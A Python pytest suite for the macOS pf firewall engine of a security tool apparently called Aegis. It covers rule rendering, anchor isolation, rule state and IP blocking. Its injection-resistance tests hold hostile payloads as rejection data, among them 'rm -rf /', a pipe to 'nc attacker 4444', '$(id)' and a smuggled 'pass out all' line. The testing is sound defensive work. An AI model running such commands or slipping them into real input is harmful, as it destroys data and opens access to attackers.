"""Tests for the secure macOS (pf) firewall engine.

pf is declarative — Aegis renders a whole ruleset into a private anchor rather
than mutating rules one at a time — so these tests assert on the *rendered
ruleset* as well as on the argument lists, proving the same properties the
Windows and Linux suites do:

* malicious input is rejected before it can reach the ruleset,
* commands are passed as an argument **list**, never a shell string,
* a disabled rule is genuinely absent from the loaded ruleset.
"""
import pytest

from aegis import RULE_TAG
from aegis.core.models import (
    FirewallAction,
    FirewallDirection,
    FirewallRule,
    Protocol,
)
from aegis.core.validators import ValidationError
from aegis.response.command import RunResult
from aegis.response.macos import ANCHOR, PfManager, _af_for, _port_expr


class RecordingRunner:
    """Fake CommandRunner: records argv lists, returns canned results."""

    def __init__(self, result: RunResult | None = None):
        self.calls: list[list[str]] = []
        self._result = result if result is not None else RunResult(0, b"")

    def __call__(self, args, timeout):
        assert isinstance(args, list), "commands must be argument lists, not strings"
        assert all(isinstance(a, str) for a in args)
        self.calls.append(list(args))
        return self._result


def _mk(tmp_path, runner=None):
    return PfManager(runner=runner or RecordingRunner(),
                     state_path=tmp_path / "rules.json",
                     anchor_path=tmp_path / "pf.aegis.conf")


@pytest.fixture
def mgr(tmp_path):
    return _mk(tmp_path)


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def test_address_family_detection():
    assert _af_for("any", "192.168.1.1") == "inet"
    assert _af_for("any", "2001:db8::1") == "inet6"
    assert _af_for("any", "2001:db8::/32") == "inet6"
    assert _af_for("any", "any") == "inet"


def test_port_expression_forms():
    assert _port_expr("443") == "port 443"
    assert _port_expr("8000-8080") == "port 8000:8080"
    assert _port_expr("80,443") == "port { 80, 443 }"


# --------------------------------------------------------------------------- #
# Rule rendering
# --------------------------------------------------------------------------- #
def test_render_outbound_block(mgr):
    rule = FirewallRule(name="bad host", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, protocol=Protocol.TCP,
                        remote_ip="45.9.1.1", remote_port="4444")
    line = mgr.render_rule(rule)

    assert line.startswith("block drop out quick inet proto tcp")
    assert "to 45.9.1.1" in line
    assert "port 4444" in line
    assert line.endswith(f"# {RULE_TAG} bad host")


def test_render_inbound_swaps_source_and_destination(mgr):
    rule = FirewallRule(name="inbound", direction=FirewallDirection.IN,
                        action=FirewallAction.BLOCK, protocol=Protocol.TCP,
                        remote_ip="45.9.1.1", remote_port="4444")
    line = mgr.render_rule(rule)

    assert " in quick " in line
    # On ingress the remote peer is the source.
    assert "from 45.9.1.1" in line


def test_render_allow_rule_passes(mgr):
    rule = FirewallRule(name="allow", direction=FirewallDirection.OUT,
                        action=FirewallAction.ALLOW, remote_ip="10.0.0.5")
    assert mgr.render_rule(rule).startswith("pass out quick")


def test_render_ipv6_uses_inet6(mgr):
    rule = FirewallRule(name="v6", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="2001:db8::1")
    assert "inet6" in mgr.render_rule(rule)


def test_render_cidr_is_accepted(mgr):
    rule = FirewallRule(name="subnet", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="192.168.1.0/24")
    assert "to 192.168.1.0/24" in mgr.render_rule(rule)


def test_render_rejects_dash_range_with_explanation(mgr):
    """pf has no dash-range syntax; we refuse rather than silently mistranslate."""
    rule = FirewallRule(name="range", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="10.0.0.1-10.0.0.9")
    with pytest.raises(ValidationError, match="CIDR"):
        mgr.render_rule(rule)


def test_render_tags_rule_name(mgr):
    rule = FirewallRule(name="untagged", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="1.1.1.1")
    assert mgr.render_rule(rule).endswith(f"# {RULE_TAG} untagged")


# --------------------------------------------------------------------------- #
# Injection resistance — the core security property
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("payload", [
    'evil; rm -rf /',
    'evil && reboot',
    'evil | nc attacker 4444',
    'evil`whoami`',
    'evil$(id)',
    'evil\npass out all',
    'evil" pass all #',
])
def test_injection_payloads_in_rule_name_are_rejected(mgr, payload):
    rule = FirewallRule(name=payload, direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip="1.1.1.1")
    with pytest.raises(ValidationError):
        mgr.render_rule(rule)


@pytest.mark.parametrize("payload", ["1.1.1.1; reboot", "$(id)", "1.1.1.1 && ls"])
def test_injection_payloads_in_ip_are_rejected(mgr, payload):
    rule = FirewallRule(name="ok", direction=FirewallDirection.OUT,
                        action=FirewallAction.BLOCK, remote_ip=payload)
    with pytest.raises(ValidationError):
        mgr.render_rule(rule)


def test_create_rule_with_bad_input_runs_no_command(tmp_path):
    runner = RecordingRunner()
    m = _mk(tmp_path, runner)
    result = m.create_rule(FirewallRule(name="evil; reboot", remote_ip="1.1.1.1"))
    assert result.ok is False
    assert "Invalid rule" in result.message
    assert runner.calls == [], "no command may run for an invalid rule"


# --------------------------------------------------------------------------- #
# Anchor isolation
# --------------------------------------------------------------------------- #
def test_pfctl_loads_into_private_anchor(tmp_path):
    """Aegis must never load rules into pf's main ruleset."""
    runner = RecordingRunner()
    m = _mk(tmp_path, runner)
    m.create_rule(FirewallRule(name="scoped", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="1.1.1.1"))
    assert len(runner.calls) == 1
    call = runner.calls[0]
    assert call[0] == "pfctl"
    assert call[call.index("-a") + 1] == ANCHOR


def test_anchor_file_is_written(tmp_path):
    m = _mk(tmp_path)
    m.create_rule(FirewallRule(name="written", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="1.1.1.1"))
    content = (tmp_path / "pf.aegis.conf").read_text()
    assert "block drop out quick" in content
    assert "1.1.1.1" in content


def test_anchor_not_installed_when_pf_conf_absent(mgr):
    # /etc/pf.conf does not exist on the test platform.
    assert mgr.anchor_installed() is False


def test_setup_instructions_name_the_anchor():
    assert ANCHOR in PfManager.setup_instructions()


# --------------------------------------------------------------------------- #
# State round-tripping
# --------------------------------------------------------------------------- #
def test_disabled_rule_is_absent_from_ruleset(tmp_path):
    m = _mk(tmp_path)
    created = m.create_rule(FirewallRule(name="toggle", direction=FirewallDirection.OUT,
                                         action=FirewallAction.BLOCK, remote_ip="9.9.9.9"))
    assert "9.9.9.9" in (tmp_path / "pf.aegis.conf").read_text()

    assert m.set_rule_enabled(created.rule_name, False).ok
    assert "9.9.9.9" not in (tmp_path / "pf.aegis.conf").read_text()
    assert m.list_rules()[0].enabled is False

    assert m.set_rule_enabled(created.rule_name, True).ok
    assert "9.9.9.9" in (tmp_path / "pf.aegis.conf").read_text()


def test_delete_removes_rule_from_state_and_ruleset(tmp_path):
    m = _mk(tmp_path)
    created = m.create_rule(FirewallRule(name="doomed", direction=FirewallDirection.OUT,
                                         action=FirewallAction.BLOCK, remote_ip="1.2.3.4"))
    assert m.delete_rule(created.rule_name).ok
    assert m.list_rules() == []
    assert "1.2.3.4" not in (tmp_path / "pf.aegis.conf").read_text()


def test_delete_unknown_rule_fails(mgr):
    assert mgr.delete_rule("Aegis ghost").ok is False


def test_search_rules_matches_field_values(tmp_path):
    m = _mk(tmp_path)
    m.create_rule(FirewallRule(name="findme", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="203.0.113.7"))
    assert len(m.search_rules("203.0.113")) == 1
    assert m.search_rules("nothing-matches") == []


# --------------------------------------------------------------------------- #
# Containment
# --------------------------------------------------------------------------- #
def test_block_ip_creates_both_directions(tmp_path):
    m = _mk(tmp_path)
    assert m.block_ip("45.9.1.1", note="NET-C2-PORT T1571").ok
    rules = m.list_rules()
    assert len(rules) == 2
    assert {r.direction for r in rules} == {FirewallDirection.OUT, FirewallDirection.IN}


def test_block_ip_refuses_any(mgr):
    for value in ("any", "0.0.0.0", "*"):
        result = mgr.block_ip(value)
        assert result.ok is False
        assert "Refusing to block" in result.message


def test_block_ip_rejects_invalid_address(mgr):
    assert mgr.block_ip("not-an-ip").ok is False


# --------------------------------------------------------------------------- #
# Result interpretation
# --------------------------------------------------------------------------- #
def test_permission_denied_flags_needs_admin(tmp_path):
    m = _mk(tmp_path, RecordingRunner(RunResult(1, b"", b"pfctl: Permission denied")))
    result = m.create_rule(FirewallRule(name="nope", direction=FirewallDirection.OUT,
                                        action=FirewallAction.BLOCK, remote_ip="1.1.1.1"))
    assert result.ok is False
    assert result.needs_admin is True


def test_failed_create_does_not_persist_state(tmp_path):
    m = _mk(tmp_path, RecordingRunner(RunResult(1, b"", b"syntax error")))
    m.create_rule(FirewallRule(name="fails", direction=FirewallDirection.OUT,
                               action=FirewallAction.BLOCK, remote_ip="1.1.1.1"))
    assert m.list_rules() == [], "a rule that did not apply must not be recorded"
